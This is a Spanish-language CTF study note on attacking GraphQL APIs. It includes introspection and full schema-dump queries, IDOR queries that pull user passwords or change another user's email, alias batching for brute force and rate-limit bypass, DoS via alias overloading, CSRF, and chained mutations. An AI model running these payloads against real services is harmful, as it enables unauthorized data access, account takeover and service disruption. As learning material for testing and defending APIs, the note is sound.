## 📌 Índice

- [[#🧠 ¿Qué es GraphQL?]]
- [[#🧩 Diferencias entre REST y GraphQL]]
- [[#🔍 Qué es la Introspection en GraphQL]]
- [[#⚠️ Riesgos de seguridad de la Introspection]]
- [[#📡 Descubrir endpoints GraphQL]]
- [[#🧪 Comprobación básica de GraphQL]]
- [[#🔎 Enumeración básica con Introspection]]
- [[#🧬 Dump completo del esquema (Schema Dump)]]
- [[#🧭 Interpretar el esquema obtenido]]
- [[#🧱 Tipos principales en GraphQL]]
- [[#📥 Queries: cómo extraer información]]
- [[#✏️ Mutations: modificar datos]]
- [[#🧨 IDOR en GraphQL]]
- [[#🔗 IDOR usando Mutations]]
- [[#🧪 Enumeración práctica paso a paso (CTF workflow)]]
- [[#🧰 Herramientas útiles]]
- [[#🗺️ Visualización con GraphQL Voyager]]
- [[#🚧 GraphQL sin introspection]]
- [[#🧠 Técnicas de bypass de introspection]]
- [[#🧬 Batching y abuso de alias]]
- [[#💥 DoS en GraphQL]]
- [[#🧱 CSRF en GraphQL]]
- [[#🔓 Bypass de autorización en GraphQL]]
- [[#📌 Resumen mental para CTF]]
    

---

## 🧠 ¿Qué es GraphQL?

**GraphQL** es un lenguaje de consulta para APIs que permite al cliente definir exactamente qué datos quiere recibir.

En lugar de tener múltiples endpoints como en REST:

```
/users
/users/1
/users/1/orders
```

GraphQL usa **un solo endpoint**, normalmente:

```
/graphql
```

y desde ahí se envían consultas que describen qué datos se desean.

---

## 🧩 Diferencias entre REST y GraphQL

|REST|GraphQL|
|---|---|
|Múltiples endpoints|Un solo endpoint|
|Respuestas fijas|Respuesta personalizada|
|Over-fetching / under-fetching|Solo lo que pides|
|Métodos HTTP|Query / Mutation|
|Difícil de versionar|Versionado implícito|
|Menos introspectivo|Totalmente introspectivo|

---

## 🔍 Qué es la Introspection en GraphQL

La **introspection** permite consultar el propio esquema GraphQL.

Es decir:

> la API puede explicarte cómo está construida.

Con introspection puedes descubrir:

- tipos disponibles
    
- campos
    
- argumentos
    
- queries
    
- mutations
    
- relaciones
    
- tipos internos
    
- directivas
    

Esto se logra usando campos especiales como:

```
__schema
__type
__typename
```

---

## ⚠️ Riesgos de seguridad de la Introspection

Si está habilitada en producción:

- revela toda la superficie de ataque
    
- muestra mutaciones internas
    
- facilita IDOR
    
- permite descubrir lógica sensible
    
- acelera explotación
    

👉 **No es una vulnerabilidad por sí sola**, pero es el paso 0 de casi todos los ataques GraphQL.

---

## 📡 Descubrir endpoints GraphQL

Rutas comunes:

```
/graphql
/graphiql
/graphql.php
/graphql/console
/api
/api/graphql
/graphql/api
```

Se pueden descubrir vía:

- fuzzing
    
- fuerza bruta
    
- código frontend
    
- tráfico interceptado
    
- devtools
    

---

## 🧪 Comprobación básica de GraphQL

### Query universal

```graphql
query { __typename }
```

Respuesta típica:

```json
{
  "data": {
    "__typename": "Query"
  }
}
```

✅ Si responde → **es GraphQL**

---

## 🔎 Enumeración básica con Introspection

### Enumerar tipos disponibles

```graphql
query {
  __schema {
    types {
      name
    }
  }
}
```

---

### Enumerar tipos + campos + argumentos

```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        args {
          name
          description
          type {
            name
            kind
            ofType {
              name
              kind
            }
          }
        }
      }
    }
  }
}
```

Esto permite descubrir:

- qué parámetros acepta cada query
    
- qué tipo de datos espera
    
- cómo explotarlos
    

---

## 🧬 Dump completo del esquema (Schema Dump)

Consulta completa (la más usada en CTFs):

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
    }
  }
}
```

---

## 🧭 Interpretar el esquema obtenido

Una vez que obtienes el esquema:

1. Busca el **Query type**
    
2. Mira qué campos se pueden consultar
    
3. Detecta si aceptan parámetros
    
4. Identifica tipos sensibles:
    
    - User
        
    - Account
        
    - Order
        
    - Admin
        
    - Flag
        
    - Secret
        
    - Token
        
    - Password
        

---

## 🧱 Tipos principales en GraphQL

- **Query** → lectura
    
- **Mutation** → escritura
    
- **Subscription** → tiempo real
    
- **Object Types**
    
- **Input Types**
    
- **Scalar**
    
- **Enum**
    

---

## 📥 Queries: cómo extraer información

Ejemplo básico:

```graphql
query {
  flags {
    name
    value
  }
}
```

Si el tipo devuelve objetos:

```graphql
query {
  user {
    username
    password
  }
}
```

---

### Query con argumentos

```graphql
query {
  user(uid: 1) {
    user
    password
  }
}
```

📌 Si funciona → **IDOR confirmado**

---

### Enumeración por fuerza bruta de IDs

```graphql
query {
  user(uid: 1) { user password }
}
query {
  user(uid: 2) { user password }
}
```

---

## ✏️ Mutations: modificar datos

Las **mutations** sirven para:

- crear
    
- editar
    
- borrar
    
- actualizar
    

Ejemplo:

```graphql
mutation {
  addMovie(
    name: "Jumanji",
    rating: "6.8",
    releaseYear: 2019
  ) {
    movies {
      name
      rating
    }
  }
}
```

---

### Mutación con relaciones

```graphql
mutation {
  addPerson(
    name: "John",
    email: "john@test.com",
    friends: [{ name: "Alice" }],
    subscribedMovies: [{ name: "Matrix" }]
  ) {
    person {
      name
      email
    }
  }
}
```

---

## 🧨 IDOR en GraphQL

### ¿Qué es?

Ocurre cuando puedes acceder o modificar recursos ajenos solo cambiando un ID.

Ejemplo:

```graphql
query {
  order(id: 123) {
    total
  }
}
```

Cambias a:

```graphql
order(id: 124)
```

y funciona → **IDOR**

---

## 🔗 IDOR usando Mutations

Ejemplo clásico:

```graphql
mutation {
  updateUser(
    id: "5",
    email: "attacker@mail.com"
  ) {
    id
    email
  }
}
```

Si eres usuario 1 pero puedes modificar usuario 5 → **IDOR crítico**

---

## 🧪 Enumeración práctica paso a paso (workflow CTF)

### 1️⃣ Encuentra endpoint GraphQL

### 2️⃣ Prueba `query{__typename}`

### 3️⃣ Ejecuta introspection

### 4️⃣ Dump del schema

### 5️⃣ Pásalo a GraphQL Voyager

### 6️⃣ Identifica:

- queries interesantes
    
- mutations críticas
    
- argumentos tipo ID
    

### 7️⃣ Prueba:

- cambiar IDs
    
- omitir autenticación
    
- modificar campos
    
- usar múltiples queries
    

### 8️⃣ Verifica impacto

---

## 🧰 Herramientas útiles

- **GraphQL Voyager** → visualizar esquema
    
- **GraphiQL**
    
- **Burp Suite**
    
- **GraphQuail**
    
- **clairvoyance**
    
- **graphw00f**
    
- **graphql-cop**
    
- **Postman**
    
- **curl**
    

---

## 🗺️ Visualización con GraphQL Voyager

1. Ejecutas introspection
    
2. Copias el JSON
    
3. Pegas en:  
    👉 [https://apis.guru/graphql-voyager/](https://apis.guru/graphql-voyager/)
    
4. Obtienes el grafo completo de relaciones
    

Esto te permite:

- ver relaciones ocultas
    
- detectar puntos débiles
    
- planear explotación
    

---

## 🚧 GraphQL sin introspection

Aunque esté deshabilitada:

### Métodos para reconstruir esquema:

- Errores del servidor
    
- Mensajes de validación
    
- DevTools → archivos JS
    
- Queries hardcodeadas
    
- GraphQuail
    
- Clairvoyance
    
- WebSockets
    
- fuzzing
    

---

## 🧠 Bypass de introspection

Algunos filtros solo bloquean `__schema`.

Bypass:

```graphql
query {
  __schema 
  {
    queryType { name }
  }
}
```

O usando saltos de línea:

```graphql
query {
  __schema
  {
    queryType { name }
  }
}
```

También:

- GET en lugar de POST
    
- x-www-form-urlencoded
    
- WebSockets
    

---

## 🧬 Batching y abuso de alias

Ejemplo:

```graphql
query {
  a: isValid(code: 1)
  b: isValid(code: 2)
  c: isValid(code: 3)
}
```

Permite:

- brute force
    
- bypass rate limit
    
- validar múltiples inputs
    

---

## 💥 DoS en GraphQL

### Alias Overloading

Repetir el mismo campo cientos de veces:

```graphql
{
  a1: __typename
  a2: __typename
  a3: __typename
}
```

Consume CPU → DoS.

---

### Field duplication

Repetir el mismo campo sin alias:

```graphql
{
  __typename
  __typename
  __typename
}
```

---

### Batch queries

```json
[
  {"query":"{__typename}"},
  {"query":"{__typename}"},
  {"query":"{__typename}"}
]
```

Ejecutadas todas a la vez.

---

## 🧱 CSRF en GraphQL

Muchos endpoints aceptan:

```
Content-Type: application/x-www-form-urlencoded
```

Ejemplo:

```
query={ user { name } }
```

Si no hay CSRF token → vulnerable.

También posible vía GET.

---

## 🔓 Bypass de autorización

### Chaining queries

Ejemplo:

```graphql
mutation {
  forgotPassword(email:"victim@mail.com")
  register(username:"attacker", password:"123")
}
```

Ambas se ejecutan en la misma request.

---

## 📌 Resumen mental para CTF

> **GraphQL = una sola puerta, pero cientos de caminos internos**

Checklist mental:

- ✅ ¿Hay introspection?
    
- ✅ ¿Qué queries existen?
    
- ✅ ¿Qué mutations existen?
    
- ✅ ¿Aceptan IDs?
    
- ✅ ¿Validan ownership?
    
- ✅ ¿Hay batching?
    
- ✅ ¿Hay alias?
    
- ✅ ¿Hay errores verbosos?
    
- ✅ ¿Se puede bypass auth?
    
- ✅ ¿Se puede modificar data?
    

---

